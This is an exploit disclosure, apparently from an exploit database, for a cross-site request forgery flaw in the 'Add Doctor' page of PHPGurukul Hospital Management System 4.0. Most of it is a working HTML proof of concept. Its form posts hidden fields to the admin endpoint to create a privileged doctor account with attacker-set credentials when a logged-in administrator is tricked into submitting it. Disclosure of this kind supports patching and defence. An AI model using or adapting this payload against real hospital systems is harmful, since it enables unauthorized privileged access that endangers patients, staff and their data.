# Exploit Title: Hospital Management System 4.0 - Cross-Site Request Forgery (Add Doctor)
# Date: 2025-12-19
# Exploit Author: Syntropy Security (Sankalp Devidas Hanwate)
# Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php/
# Software Link: https://phpgurukul.com/hospital-management-system-in-php/
# Version: 4.0
# Tested on: Linux/Apache/MySQL (LAMP)
# CVE: CVE-2025-XXXX (Waiting for assignment)

# Description:
# The 'Add Doctor' module in PHPGurukul Hospital Management System v4.0 is vulnerable to 
# Cross-Site Request Forgery (CSRF). The application fails to implement Anti-CSRF tokens 
# on the '/admin/add-doctor.php' endpoint. This allows an attacker to create a privileged 
# 'Doctor' account by tricking an authenticated administrator into visiting a malicious page.

# Proof of Concept:
# 1. Save the following HTML code as 'csrf_exploit.html'.
# 2. Host the file or open it locally while logged in as an Administrator.
# 3. Click the submit button to create a new Doctor account.

<html>
  <body>
    <h1>CSRF Attack Console</h1>
    <form action="http://localhost/Hospital-Management-System-PHP/hospital/hms/admin/add-doctor.php" method="POST">
      
      <input type="hidden" name="docspec" value="1">
      <input type="hidden" name="docname" value="Dr Evil">
      <input type="hidden" name="docaddress" value="Dark Tower">
      <input type="hidden" name="docfees" value="500">
      <input type="hidden" name="doccontact" value="6666666666">
      <input type="hidden" name="docemail" value="evil@hacker.com">
      <input type="hidden" name="npass" value="Password123">
      <input type="hidden" name="cfpass" value="Password123">
      <input type="hidden" name="submit" value="submit"> 
      
      <input type="submit" value="CLICK TO INJECT DR. EVIL">
    </form>
  </body>
</html>